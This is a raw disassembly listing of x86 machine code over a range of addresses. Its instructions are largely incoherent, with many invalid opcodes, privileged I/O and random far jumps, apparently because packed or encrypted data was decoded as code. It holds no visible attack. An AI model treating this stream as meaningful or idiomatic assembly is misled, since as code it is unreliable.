  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    BYTE PTR [ebx-0x20],bl
  417f30:	(bad)  
  417f31:	dec    esp
  417f32:	pop    eax
  417f33:	fwait
  417f34:	or     BYTE PTR [ecx],bl
  417f36:	int3   
  417f37:	imul   ebx,DWORD PTR [eax-0x17],0xffffffa9
  417f3b:	xchg   edi,eax
  417f3c:	mov    BYTE PTR [edx+esi*8],0x47
  417f40:	push   edi
  417f41:	jle    0x417f61
  417f43:	lahf   
  417f44:	leave  
  417f45:	int    0x6
  417f47:	xchg   edi,eax
  417f48:	out    dx,eax
  417f49:	push   0x866a9b7d
  417f4e:	xchg   BYTE PTR [esp+eax*8],dl
  417f51:	xchg   ebp,eax
  417f52:	cmc    
  417f53:	outs   dx,BYTE PTR ds:[esi]
  417f54:	or     edx,ebp
  417f56:	add    al,0xd4
  417f58:	shl    ch,cl
  417f5a:	shl    eax,cl
  417f5c:	scas   al,BYTE PTR es:[edi]
  417f5d:	cwde   
  417f5e:	nop
  417f5f:	xchg   ebx,eax
  417f60:	out    dx,al
  417f61:	iret   
  417f62:	rcl    DWORD PTR [eax],cl
  417f64:	call   0x57f5:0x4c4fd721
  417f6b:	add    eax,DWORD PTR [edx]
  417f6d:	imul   ebp,esi,0xd79d339a
  417f73:	pop    ebp
  417f74:	jb     0x417f6a
  417f76:	mov    bh,0x6
  417f78:	pop    esp
  417f79:	mov    es,ecx
  417f7b:	rcr    ch,0x45
  417f7e:	test   al,0x8d
  417f80:	ror    BYTE PTR [ecx+0x4d36d327],cl
  417f86:	(bad)  
  417f87:	lahf   
  417f88:	push   ebp
  417f89:	repnz fwait
  417f8b:	pop    ecx
  417f8c:	fmul   st,st(0)
  417f8e:	inc    edi
  417f8f:	jg     0x417fe3
  417f91:	mov    ?,WORD PTR [ecx]
  417f93:	xor    al,0xc8
  417f95:	and    bl,BYTE PTR [esi+0x4]
  417f98:	pop    esp
  417f99:	mov    edx,0x8ab37356
  417f9e:	sbb    eax,0x62c744f
  417fa3:	jge    0x417f6a
  417fa5:	jl     0x417f35
  417fa7:	les    ebx,FWORD PTR [eax-0x301ed371]
  417fad:	mov    al,ds:0x15b0d8b4
  417fb2:	dec    ecx
  417fb3:	push   cs
  417fb4:	imul   eax,DWORD PTR [edx+ecx*2-0x171e1f08],0x4f
  417fbc:	fisub  DWORD PTR [edi-0x5d]
  417fbf:	adc    eax,0x5ae8d724
  417fc4:	jbe    0x41802e
  417fc6:	pop    ebp
  417fc7:	sbb    al,0xda
  417fc9:	clc    
  417fca:	mov    ?,WORD PTR [ebp-0x4a]
  417fcd:	sbb    edi,DWORD PTR [ebp+0x41]
  417fd0:	pop    esi
  417fd1:	push   edx
  417fd2:	xor    eax,ebx
  417fd4:	sub    ebx,edi
  417fd6:	stos   DWORD PTR es:[edi],eax
  417fd7:	and    DWORD PTR [eax+0x47249512],edx
  417fdd:	int3   
  417fde:	(bad)  
  417fdf:	(bad)  
  417fe0:	call   0x54f0:0xff75b360
  417fe7:	or     eax,0xf8019976
  417fec:	jmp    0x4ce040e8
  417ff1:	imul   esp,DWORD PTR [edx-0x1ee8d665],0x61ad314f
  417ffb:	dec    esp
  417ffc:	jno    0x41806f
  417ffe:	add    DWORD PTR [eax-0x7b],eax
  418001:	nop
  418002:	pushf  
  418003:	popw   ss
  418005:	adc    BYTE PTR [ebp+esi*8+0x110c8478],0x8b
  41800d:	clc    
  41800e:	mov    fs,edi
  418010:	push   0xffffff8c
  418012:	imul   edx,DWORD PTR [ecx-0x28],0x9
  418016:	int3   
  418017:	and    eax,esp
  418019:	inc    esi
  41801a:	fstp   QWORD PTR [ecx-0x1e]
  41801d:	icebp  
  41801e:	mov    ds:0x522d78c6,eax
  418023:	fmul   DWORD PTR [ecx]
  418025:	or     esi,DWORD PTR [edi]
  418027:	sub    edi,ebx
  418029:	xor    al,0x69
  41802b:	mov    bl,0xa4
  41802d:	mov    edi,0x26ead3d
  418032:	(bad)  
  418033:	sbb    eax,0x86
	...
  418094:	add    BYTE PTR [eax],al
  418096:	test   eax,0xff456b7e
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx+0x63bb98c4]
  4180a3:	push   esp
  4180a4:	adc    ecx,ebp
  4180a6:	and    esp,edi
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    ch,bl
  4180af:	stos   BYTE PTR es:[edi],al
  4180b0:	xchg   DWORD PTR [edx],ebp
  4180b2:	mov    bl,0xaa
  4180b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180b5:	and    BYTE PTR [edx+0xd],dl
  4180b8:	mov    dl,0x94
  4180ba:	(bad)  
  4180bb:	rcl    dh,1
  4180bd:	out    0xaa,eax
  4180bf:	add    edi,ebp
  4180c1:	sub    eax,0x6e42c981
  4180c6:	mov    BYTE PTR [ebp+0x3d],ch
  4180c9:	test   BYTE PTR [ecx],bl
  4180cb:	mov    dl,0xd8
  4180cd:	jg     0x418140
  4180cf:	int    0x71
  4180d1:	std    
  4180d2:	(bad)  
  4180d3:	sub    esi,DWORD PTR [edx-0x2ce96d0d]
  4180d9:	jmp    0x731e8fa0
  4180de:	(bad)  
  4180e0:	loope  0x4180c1
  4180e2:	pmaxub mm3,QWORD PTR [ebx]
  4180e5:	pop    eax
  4180e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e7:	cli    
  4180e8:	mov    dh,0x7f
  4180ea:	aam    0xab
  4180ec:	fwait
  4180ed:	outs   dx,BYTE PTR ds:[esi]
  4180ee:	xor    ecx,ecx
  4180f0:	pop    edi
  4180f1:	inc    eax
  4180f2:	shl    ecx,0xe5
  4180f5:	xlat   BYTE PTR ds:[ebx]
  4180f6:	fwait
  4180f7:	pop    esp
  4180f8:	ds mov ah,0x95
  4180fb:	ins    DWORD PTR es:[edi],dx
  4180fc:	sub    bl,BYTE PTR [ebx+esi*1+0xb]
  418100:	stos   DWORD PTR es:[edi],eax
  418101:	adc    ch,BYTE PTR [ebx+0x3c]
  418104:	jnp    0x418138
  418106:	xor    DWORD PTR [ebx+esi*2-0x447f8fd6],edi
  41810d:	test   eax,0x7e63b1af
  418112:	push   es
  418113:	mov    bh,0x43
  418115:	outs   dx,BYTE PTR ds:[esi]
  418116:	repnz aas 
  418118:	cld    
  418119:	xor    ah,al
  41811b:	sub    al,0xf
  41811d:	mov    bl,0xb9
  41811f:	jmp    0x418108
  418121:	lds    ebp,FWORD PTR [edi]
  418123:	sbb    eax,eax
  418125:	imul   edi,edx,0xeb1e78cd
  41812b:	dec    ecx
  41812c:	pushf  
  41812d:	js     0x418150
  41812f:	xchg   edx,eax
  418130:	ins    DWORD PTR es:[edi],dx
  418131:	dec    edi
  418132:	lea    esp,[ebx-0xef9d08b]
  418138:	out    0xa,eax
  41813a:	out    dx,eax
  41813b:	push   es
  41813c:	aaa    
  41813d:	int3   
  41813e:	push   ebp
  41813f:	jne    0x418145
  418141:	stc    
  418142:	rol    dh,cl
  418144:	outs   dx,BYTE PTR ds:[esi]
  418145:	dec    esp
  418147:	xchg   edi,eax
  418148:	sub    BYTE PTR [ecx],dh
  41814a:	lods   al,BYTE PTR ds:[esi]
  41814b:	addr16 jle 0x41814c
  41814e:	imul   esi,ebx,0x50c27d38
  418154:	pop    es
  418155:	stos   BYTE PTR es:[edi],al
  418156:	cmp    ch,BYTE PTR ds:0x27002dc6
  41815c:	into   
  41815d:	data16 mov BYTE PTR [eax-0x5d],cl
  418161:	(bad)  
  418162:	jmp    0x130:0xcd1b58dc
  418169:	or     BYTE PTR [esi+0x4b],cl
  41816c:	ret    0xb559
  41816f:	outs   dx,DWORD PTR ds:[esi]
  418170:	xor    al,cl
  418172:	add    eax,0xe6b1daed
  418177:	adc    esp,esp
  418179:	lahf   
  41817a:	pop    esi
  41817b:	inc    esi
  41817c:	xchg   ecx,eax
  41817d:	cmp    BYTE PTR ds:0x6761c923,dh
  418183:	pop    esp
  418184:	xchg   ebx,eax
  418185:	push   esi
  418186:	jle    0x4181fc
  418188:	add    BYTE PTR [ecx+0x3ba27bc5],ah
  41818e:	add    DWORD PTR [esi+eiz*8-0x66bd9b05],0xaaa72e04
  418199:	(bad)  
  41819a:	das    
  41819b:	lock adc DWORD PTR [esi+0x16],edi
  41819f:	loopne 0x418198
  4181a1:	mov    bh,0xb5
  4181a3:	mov    al,ds:0xacd97a60
  4181a8:	stos   BYTE PTR es:[edi],al
  4181a9:	adc    al,0x72
  4181ab:	call   0xfefdd4f7
  4181b0:	mov    dl,0xfa
  4181b2:	jle    0x4181b9
  4181b4:	pop    DWORD PTR [eax]
	...
  418216:	aaa    
  418217:	xchg   edx,eax
  418218:	and    al,0x83
  41821a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41821b:	mov    bh,0xb7
  41821d:	mov    dh,0x16
  41821f:	mov    cl,ch
  418221:	(bad)  
  418222:	test   al,0x60
  418224:	mov    eax,ds:0xfd2886
  418229:	add    BYTE PTR [edi],al
  41822b:	add    DWORD PTR [eax],eax
  41822d:	add    BYTE PTR [eax],bl
  41822f:	fidivr WORD PTR [ebx+0x23f37197]
  418235:	fstp   DWORD PTR [ecx]
  418237:	call   0xe23d:0x99acb040
  41823e:	jg     0x418251
  418240:	ja     0x4181ee
  418242:	out    0x9,eax
  418244:	jl     0x41820b
  418246:	mov    bh,BYTE PTR [ebx]
  418248:	inc    esp
  418249:	bound  eax,QWORD PTR [ebp-0x4b]
  41824c:	loope  0x4182b9
  41824e:	dec    edi
  41824f:	(bad)  
  418250:	rcl    ch,1
  418252:	xor    al,0x8f
  418254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418255:	pop    esi
  418256:	add    eax,0xb9f35f39
  41825b:	sti    
  41825c:	inc    esi
  41825d:	jmp    0x4181eb
  41825f:	push   ds
  418260:	icebp  
  418261:	sti    
  418262:	xor    al,0x15
  418264:	sbb    al,0x99
  418266:	pop    ecx
  418267:	ret    0xe531
  41826a:	call   0xd936f7e7
  41826f:	mov    ecx,esp
  418271:	pop    es
  418272:	outs   dx,BYTE PTR ds:[esi]
  418273:	pusha  
  418274:	dec    BYTE PTR [edx+0x5000652f]
  41827a:	sub    al,0x4e
  41827c:	dec    edi
  41827d:	push   edx
  41827e:	pop    ecx
  41827f:	aas    
  418280:	(bad)  
  418281:	lods   eax,DWORD PTR ds:[esi]
  418282:	push   es
  418283:	data16 lods al,BYTE PTR ds:[esi]
  418285:	repnz popa 
  418287:	or     BYTE PTR [ebp+0x1aae3054],0x1e
  41828e:	pop    es
  41828f:	pop    ds
  418290:	sahf   
  418291:	jl     0x4182c8
  418293:	sbb    eax,DWORD PTR [edx-0x33c984ad]
  418299:	pop    eax
  41829a:	dec    ebp
  41829b:	aam    0xbc
  41829d:	mov    al,0xf3
  41829f:	jmp    0x41825c
  4182a1:	in     al,0x56
  4182a3:	mov    ebp,0x1622e4a5
  4182a8:	in     eax,dx
  4182a9:	xor    eax,ebp
  4182ab:	cmp    eax,ebx
  4182ad:	lock icebp 
  4182af:	daa    
  4182b0:	clc    
  4182b1:	push   0xffffffe6
  4182b3:	or     eax,0x47dfd2cb
  4182b8:	xor    dl,BYTE PTR [eax-0x19567e69]
  4182be:	mov    bh,0xde
  4182c0:	push   ss
  4182c1:	out    dx,eax
  4182c2:	arpl   WORD PTR [edx+0xb],si
  4182c5:	mov    edi,0xc761fa7b
  4182ca:	fwait
  4182cb:	jge    0x4182ed
  4182cd:	sbb    edi,ecx
  4182cf:	inc    eax
  4182d0:	sub    DWORD PTR [edi-0x7634141],0xc3171f34
  4182da:	daa    
  4182db:	fcom   QWORD PTR [eax-0x58e6390c]
  4182e1:	mov    ebp,0x560c5a8a
  4182e6:	je     0x4182b5
  4182e8:	(bad)  
  4182e9:	mov    ah,0x65
  4182eb:	mov    esi,0x9bf6df1b
  4182f0:	data16 js 0x4182f5
  4182f3:	push   eax
  4182f4:	dec    esi
  4182f5:	cs retf 0x392d
  4182f9:	fs xchg edi,eax
  4182fb:	iret   
  4182fc:	dec    edi
  4182fd:	pop    es
  4182fe:	aad    0xc5
  418300:	mov    bh,0x9e
  418302:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  418304:	dec    ebp
  418305:	inc    edx
  418306:	pop    ss
  418307:	adc    eax,0x2ac8698b
  41830c:	test   DWORD PTR [edx-0x3a],esp
  41830f:	mov    DWORD PTR [edi+0x53],ecx
  418312:	push   esi
  418313:	mov    DWORD PTR [eax-0x4631b8f1],0x6cbba2ae
  41831d:	mov    ch,0x9d
  41831f:	cmp    al,0x2
  418321:	iret   
  418322:	shr    BYTE PTR [esi-0x69],1
  418325:	adc    BYTE PTR [edi+0x4839c75e],0xf9
  41832c:	jmp    0x64f3754e
  418331:	mov    ds:0xa0124,eax
	...
  418396:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41839c:	(bad)  
  41839d:	mov    edi,0xc253ee23
  4183a2:	pop    ds
  4183a3:	mov    ebx,0xfe2f3f03
  4183a8:	add    BYTE PTR [eax],al
  4183aa:	pop    es
  4183ab:	add    DWORD PTR [eax],eax
  4183ad:	add    ch,ch
  4183af:	js     0x4183fe
  4183b1:	pop    ebx
  4183b2:	or     DWORD PTR [ecx+edi*8-0x16],0x24
  4183b7:	adc    al,0xbe
  4183b9:	pop    esp
  4183ba:	cmp    al,0x3d
  4183bc:	cmp    ebp,ebp
  4183be:	imul   DWORD PTR [ebx]
  4183c0:	cld    
  4183c1:	neg    DWORD PTR [eax+0x764557a4]
  4183c7:	dec    edx
  4183c8:	fiadd  WORD PTR [ecx+0x101d7e51]
  4183ce:	dec    edi
  4183cf:	or     al,0x81
  4183d1:	xchg   edx,eax
  4183d2:	loope  0x4183f3
  4183d4:	mov    al,0xb6
  4183d6:	adc    esi,DWORD PTR [esi]
  4183d8:	enter  0xbfed,0xa9
  4183dc:	ds and al,0x86
  4183df:	inc    ecx
  4183e0:	shl    DWORD PTR [edi-0x21],1
  4183e3:	into   
  4183e4:	ins    DWORD PTR es:[edi],dx
  4183e5:	xor    DWORD PTR [ebx],edx
  4183e7:	adc    BYTE PTR [eax],cl
  4183e9:	ret    0xfb42
  4183ec:	lock pop edx
  4183ee:	sub    bl,bl
  4183f0:	inc    ebp
  4183f1:	(bad)  
  4183f2:	push   edi
  4183f3:	repnz sbb BYTE PTR [edx-0x7041af47],dl
  4183fa:	mov    eax,ds:0xda847f63
  4183ff:	or     edx,DWORD PTR [ebx+0x6ca6611]
  418405:	call   FWORD PTR [esi+0x16]
  418408:	sub    esp,DWORD PTR [esi+0x6c6b6069]
  41840e:	out    dx,eax
  41840f:	push   cs
  418410:	xchg   ebx,eax
  418411:	push   es
  418412:	jecxz  0x418467
  418414:	sub    al,cl
  418416:	adc    ebx,ebx
  418418:	cmp    al,0xb2
  41841a:	cli    
  41841b:	add    esp,DWORD PTR [edi+0x3d95591d]
  418421:	mov    ch,0x3
  418423:	mov    eax,0xf4b0956e
  418428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418429:	call   0xd96a:0x259e7e01
  418430:	jg     0x4183cd
  418432:	aam    0xa
  418434:	imul   esp,DWORD PTR [ecx],0x58
  418437:	push   ebp
  418438:	pop    edx
  418439:	in     al,dx
  41843a:	mov    DWORD PTR [ecx+0x9f486ab],edx
  418440:	stc    
  418441:	mov    ah,0xfd
  418443:	adc    al,0x8f
  418445:	xchg   ebp,eax
  418446:	fnstsw WORD PTR [ebx+edi*8+0x4e]
  41844a:	pop    es
  41844b:	cli    
  41844c:	inc    esi
  41844d:	aaa    
  41844e:	std    
  41844f:	into   
  418450:	punpckhbw mm7,QWORD PTR [eax-0x4a297eb1]
  418457:	std    
  418458:	cmp    esi,DWORD PTR ds:[ebp-0x2ba47f78]
  41845f:	push   0x19
  418461:	cmp    esi,DWORD PTR [esi+ebp*1]
  418464:	test   BYTE PTR [edx+0x57],ch
  418467:	nop
  418468:	dec    esp
  418469:	or     bl,al
  41846b:	out    dx,al
  41846c:	dec    edi
  41846d:	add    eax,0xbef8f700
  418472:	adc    esi,ebp
  418474:	jmp    0x7d6100aa
  418479:	stos   BYTE PTR es:[edi],al
  41847a:	dec    edi
  41847b:	jno    0x4184db
  41847d:	mov    BYTE PTR [eax-0x49],dl
  418480:	adc    bh,0x98
  418483:	popf   
  418484:	fcomp  QWORD PTR [ebx]
  418486:	xor    bl,dl
  418488:	jb     0x4184c9
  41848a:	cli    
  41848b:	pop    ds
  41848c:	lds    ebx,FWORD PTR [ebx-0x76]
  41848f:	lods   eax,DWORD PTR ds:[esi]
  418490:	cmp    esi,DWORD PTR [edi-0x7896bf1]
  418496:	sahf   
  418497:	int3   
  418498:	(bad)  
  418499:	dec    ecx
  41849a:	data16 (bad) 
  41849c:	out    0xdb,al
  41849e:	xor    DWORD PTR [edi],esi
  4184a0:	mov    al,ds:0xf139d4b5
  4184a5:	adc    DWORD PTR [esi],esi
  4184a7:	or     esi,DWORD PTR [edi+0x6f]
  4184aa:	stos   DWORD PTR es:[edi],eax
  4184ab:	retf   
  4184ac:	cmp    al,0x7b
  4184ae:	push   eax
  4184af:	aam    0x11
  4184b1:	mov    dl,0x83
  4184b3:	mov    al,0x8
	...
  418515:	add    BYTE PTR [ecx-0x7],al
  418518:	mov    ebx,ebx
  41851a:	mov    ebx,0x26fb51fb
  41851f:	xchg   edi,eax
  418520:	mov    ecx,DWORD PTR [eax+eiz*4+0x362c6f9e]
  418527:	inc    DWORD PTR [eax]
  418529:	add    BYTE PTR [edi],al
  41852b:	add    DWORD PTR [eax],eax
  41852d:	add    BYTE PTR [eax],bl
  41852f:	mov    edi,0xdcfb1003
  418534:	mov    dh,0xc1
  418536:	inc    esp
  418537:	jmp    0xe6d:0x6e74cf47
  41853e:	mov    bh,0x38
  418540:	div    edi
  418542:	xchg   ecx,eax
  418543:	mov    dh,0xd9
  418545:	ja     0x418541
  418547:	outs   dx,BYTE PTR ds:[esi]
  418548:	ja     0x418586
  41854a:	inc    esi
  41854b:	or     DWORD PTR [esi],eax
  41854d:	dec    esi
  41854e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41854f:	sar    DWORD PTR [eax-0x2e],cl
  418552:	ja     0x4184fb
  418554:	mov    ebp,DWORD PTR [ebx]
  418556:	push   ebx
  418557:	test   BYTE PTR [edi-0x52],ah
  41855a:	clc    
  41855b:	cmc    
  41855c:	xchg   edi,eax
  41855d:	and    BYTE PTR [eax],ah
  41855f:	mov    bh,0x6e
  418561:	rcl    DWORD PTR [ebp+0x50],0xaf
  418565:	aaa    
  418566:	data16 adc BYTE PTR [ecx],dh
  418569:	loope  0x41852a
  41856b:	mul    BYTE PTR [ebp-0x2e]
  41856e:	aas    
  41856f:	fwait
  418570:	enter  0x469d,0xd7
  418574:	out    0xdb,al
  418576:	jmp    0xf530:0x89f9a400
  41857d:	enter  0x3f3d,0x39
  418581:	mov    cl,0x84
  418583:	inc    edx
  418584:	jne    0x418552
  418586:	mov    ebx,0x1ced19ec
  41858b:	clc    
  41858c:	int    0xf4
  41858e:	shr    BYTE PTR [edx-0x7a610895],1
  418594:	mov    bh,0xff
  418596:	mov    bl,0x68
  418598:	(bad)  
  418599:	aam    0x47
  41859b:	(bad)
  41859f:	sub    eax,esp
  4185a1:	sub    DWORD PTR [esi],eax
  4185a3:	ins    BYTE PTR es:[edi],dx
  4185a4:	sbb    ch,bh
  4185a6:	xchg   DWORD PTR [ebp-0x52],esp
  4185a9:	stos   BYTE PTR es:[edi],al
  4185aa:	pop    ebp
  4185ab:	xor    edi,0xb85e40f6
  4185b1:	dec    ebx
  4185b2:	push   0xffffff84
  4185b4:	jae    0x418565
  4185b6:	dec    ebx
  4185b7:	inc    edi
  4185b8:	ja     0x4185c5
  4185ba:	or     BYTE PTR [eax+0x20c8d8ac],dl
  4185c0:	adc    eax,edi
  4185c2:	fs xchg ebp,eax
  4185c4:	jg     0x418616
  4185c6:	or     DWORD PTR [ebp-0xa],edi
  4185c9:	stos   BYTE PTR es:[edi],al
  4185ca:	cmp    dh,BYTE PTR [eax-0x5313ba48]
  4185d0:	fld    DWORD PTR [edi+0x24d2f7b4]
  4185d6:	ins    BYTE PTR es:[edi],dx
  4185d7:	and    cl,BYTE PTR [esi-0x456d980c]
  4185dd:	mov    cl,0x8b
  4185df:	jl     0x418618
  4185e1:	jne    0x41862e
  4185e3:	int    0x76
  4185e5:	cmp    eax,0xba71e25
  4185ea:	push   edi
  4185eb:	mov    DWORD PTR [eax+0x1f1b1d76],ebx
  4185f1:	xor    eax,0xe97c7e44
  4185f6:	outs   dx,DWORD PTR ds:[esi]
  4185f7:	pop    ss
  4185f8:	ds inc esp
  4185fa:	or     eax,0x4d731e9f
  4185ff:	adc    cl,BYTE PTR [esi+0x21]
  418602:	mov    ah,0xb2
  418604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418605:	mov    ecx,0xfeb2500f
  41860a:	shl    BYTE PTR [edi-0x777b9dc],0xc1
  418611:	or     dh,ah
  418613:	jbe    0x418626
  418615:	add    eax,0xcbbb2093
  41861a:	mov    dl,dh
  41861c:	jp     0x4185ab
  41861e:	cmp    edi,DWORD PTR [ecx+edi*2-0x2e685773]
  418625:	mov    ch,0x85
  418627:	outs   dx,BYTE PTR ds:[esi]
  418628:	es pop edx
  41862a:	sub    DWORD PTR [ebp+edi*2+0x75fb7f30],esp
  418631:	mov    cl,0xef
  418633:	(bad)  
  418634:	xchg   esi,eax
	...
  418695:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41869b:	mov    esp,0xba07af9f
  4186a0:	xor    BYTE PTR [esi+0x50a01e53],bh
  4186a6:	cmp    eax,0x7000100
  4186ab:	add    DWORD PTR [eax],eax
  4186ad:	add    cl,bl
  4186af:	sahf   
  4186b0:	push   ebp
  4186b1:	shl    BYTE PTR [ecx],1
  4186b3:	adc    BYTE PTR [ebx+esi*1],0xd2
  4186b7:	aaa    
  4186b8:	mov    eax,ds:0xd5d459c3
  4186bd:	(bad)  
  4186be:	cmp    bl,BYTE PTR [ebx+0x5c7de47f]
  4186c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186c5:	repnz or ecx,DWORD PTR [edi-0x6d]
  4186c9:	and    DWORD PTR [ebx],ebp
  4186cb:	sahf   
  4186cc:	das    
  4186cd:	xchg   esp,eax
  4186ce:	sub    dh,BYTE PTR [edi-0x5651c76d]
  4186d4:	(bad)  
  4186d5:	jl     0x41870d
  4186d7:	clc    
  4186d8:	aad    0xd3
  4186da:	repz bound edi,QWORD PTR [ebp-0x1a]
  4186de:	mov    bh,0xbc
  4186e0:	mov    cs,WORD PTR [eax-0x13]
  4186e3:	push   0x7421dcf3
  4186e8:	test   al,0x40
  4186ea:	lds    edx,FWORD PTR [edx+ecx*4+0x23]
  4186ee:	jne    0x418691
  4186f0:	cmp    BYTE PTR [edx],al
  4186f2:	addr16 jbe 0x418732
  4186f5:	lods   al,BYTE PTR ds:[esi]
  4186f6:	ret    0xb83a
  4186f9:	push   cs
  4186fa:	cdq    
  4186fb:	imul   esi,ecx,0x61
  4186fe:	mov    al,ds:0x4b031e0d
  418703:	mov    dh,ch
  418705:	not    esp
  418707:	lds    edx,FWORD PTR [edi-0x4d2e85fa]
  41870d:	rcr    edi,1
  41870f:	stc    
  418710:	call   0x10e7:0x37a4948f
  418717:	mov    ecx,0x9c3d3112
  41871c:	inc    esi
  41871d:	lock (bad) 
  41871f:	jmp    0x7cef1fe
  418724:	xchg   ecx,eax
  418725:	pop    ds
  418726:	xor    al,0xf8
  418728:	in     eax,dx
  418729:	pop    esi
  41872a:	out    0x38,eax
  41872c:	in     al,0xa
  41872e:	cmc    
  41872f:	or     cl,al
  418731:	jge    0x418738
  418733:	mov    ebx,0x2c6977da
  418738:	mov    edx,0x3a70a6c
  41873d:	sahf   
  41873e:	pop    ds
  41873f:	addr16 dec ecx
  418741:	test   BYTE PTR [esi-0x79e8a1a8],dl
  418747:	adc    BYTE PTR [bp+si],dl
  41874a:	shr    DWORD PTR [ebx+edx*8],cl
  41874d:	(bad)  
  41874e:	mov    bl,0x1d
  418750:	and    BYTE PTR [eax-0x7d],al
  418753:	jg     0x4187b5
  418755:	ret    
  418756:	inc    ebp
  418757:	loope  0x4186dc
  418759:	lods   eax,DWORD PTR ds:[esi]
  41875a:	push   edx
  41875b:	sbb    dh,BYTE PTR [ebp-0x403eeaf1]
  418761:	mov    esi,DWORD PTR [ebx]
  418763:	fbld   TBYTE PTR [ecx-0x6f]
  418766:	fild   WORD PTR [edi+0x3a]
  418769:	outs   dx,DWORD PTR ds:[esi]
  41876a:	dec    ebx
  41876b:	add    ch,ch
  41876d:	adc    bh,BYTE PTR [ebx]
  41876f:	shl    ebx,cl
  418771:	fadd   DWORD PTR [edi+esi*2-0x5b91be61]
  418778:	jecxz  0x418718
  41877a:	or     esi,DWORD PTR [edi+0x45d10bfd]
  418780:	loope  0x4187e4
  418782:	and    edi,DWORD PTR [ebx+0x77]
  418785:	cld    
  418786:	push   eax
  418787:	sbb    esp,eax
  418789:	push   cs
  41878a:	push   ecx
  41878b:	push   ecx
  41878c:	repnz (bad) 
  41878e:	jle    0x4187f1
  418790:	push   ecx
  418791:	test   al,0x40
  418793:	vandnps xmm7,xmm6,XMMWORD PTR [ebx+edi*1+0x6f]
  418799:	jo     0x418786
  41879b:	arpl   WORD PTR [esi+0x1c024da8],di
  4187a1:	or     bh,BYTE PTR [eax+0x55]
  4187a4:	or     BYTE PTR [esi+ebp*2+0x3aaa0d7],dl
  4187ab:	repnz pop esi
  4187ad:	jmp    0x452f:0x851d4671
  4187b4:	fild   DWORD PTR [eax]
	...
  418816:	xchg   esp,eax
  418817:	enter  0x4337,0x7f
  41881b:	push   esp
  41881d:	fisttp WORD PTR [eax]
  41881f:	test   eax,0x70f67be5
  418824:	ins    DWORD PTR es:[edi],dx
  418825:	lods   al,BYTE PTR ds:[esi]
  418826:	inc    esp
  418827:	add    DWORD PTR [ecx],eax
  418829:	add    BYTE PTR [edi],al
  41882b:	add    DWORD PTR [eax],eax
  41882d:	add    BYTE PTR ds:0xece89f9c,dh
  418833:	dec    edi
  418834:	xor    al,0x9c
  418836:	enter  0x13d5,0xd8
  41883a:	scas   eax,DWORD PTR es:[edi]
  41883b:	call   FWORD PTR [edi-0x6ac791d4]
  418841:	push   esp
  418842:	inc    eax
  418843:	push   ebp
  418844:	shr    DWORD PTR [di+0x2353],0xd6
  41884a:	or     DWORD PTR [eax],eax
  41884c:	pusha  
  41884d:	add    dl,BYTE PTR [eax]
  41884f:	clc    
  418850:	pop    ebx
  418851:	and    eax,0xf956032f
  418856:	push   0x44
  418858:	xchg   ebp,eax
  418859:	out    dx,eax
  41885a:	in     eax,dx
  41885b:	sub    esi,DWORD PTR [eax-0x5e7cb2d1]
  418861:	int    0x10
  418863:	xchg   DWORD PTR [ebx+0x17b95250],edx
  418869:	data16 ds aaa 
  41886c:	cmp    edx,ebp
  41886e:	adc    edx,DWORD PTR [ecx-0x10]
  418871:	sti    
  418872:	cwde   
  418873:	inc    ebx
  418874:	div    BYTE PTR [ecx]
  418876:	fnstcw WORD PTR [ebx]
  418878:	aaa    
  418879:	lods   eax,DWORD PTR ds:[esi]
  41887a:	rol    DWORD PTR [edi],0xe8
  41887d:	jae    0x4188d5
  41887f:	mov    ds:0x2d7baef3,eax
  418884:	lods   eax,DWORD PTR ds:[esi]
  418885:	pop    ecx
  418886:	int3   
  418887:	imul   eax,edx,0x2397c65a
  41888d:	jbe    0x418848
  41888f:	cmc    
  418890:	jb     0x418878
  418892:	push   0xede8721
  418897:	xchg   edi,eax
  418898:	mov    esi,0xa6b4c5d5
  41889d:	fadd   DWORD PTR [ebp-0x2eadb5f4]
  4188a3:	in     al,0x89
  4188a5:	ret    0xa94e
  4188a8:	ja     0x418927
  4188aa:	dec    ebp
  4188ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ac:	pop    eax
  4188ad:	ret    
  4188ae:	mov    al,ds:0x7d528e41
  4188b3:	xor    ch,BYTE PTR [ebx-0x1a]
  4188b6:	or     DWORD PTR [eax],edx
  4188b8:	mov    al,0xe8
  4188ba:	call   0x43e7974
  4188bf:	(bad)
  4188c2:	and    bl,bl
  4188c4:	push   ebp
  4188c5:	mov    edx,0x10f7d76
  4188ca:	ror    BYTE PTR [esi],1
  4188cc:	pop    ds
  4188cd:	add    DWORD PTR [edx],edi
  4188cf:	clc    
  4188d0:	rol    DWORD PTR [edx-0x50ee0801],cl
  4188d6:	cmp    BYTE PTR [edi],ch
  4188d8:	mov    DWORD PTR [edx-0x65],ebx
  4188db:	mov    ch,0xa3
  4188dd:	lods   eax,DWORD PTR ds:[esi]
  4188de:	mov    esp,0xcd1d1237
  4188e3:	xor    eax,0x5e902376
  4188e8:	add    eax,0x52b7b73a
  4188ed:	xlat   BYTE PTR ds:[ebx]
  4188ee:	outs   dx,DWORD PTR ds:[esi]
  4188ef:	scas   al,BYTE PTR es:[edi]
  4188f0:	xor    DWORD PTR [ecx+0x47],edx
  4188f3:	pop    ecx
  4188f4:	lds    esi,FWORD PTR [esi+0x69]
  4188f7:	xchg   esi,eax
  4188f8:	enter  0x4d54,0xfd
  4188fc:	popa   
  4188fd:	in     eax,dx
  4188fe:	cmp    esp,DWORD PTR [edi-0x54]
  418901:	adc    cl,BYTE PTR [esi]
  418903:	xchg   ebp,eax
  418904:	xor    eax,0x982f85d4
  418909:	xchg   ebx,eax
  41890a:	cmp    ebx,DWORD PTR [edi+0x20]
  41890d:	dec    edi
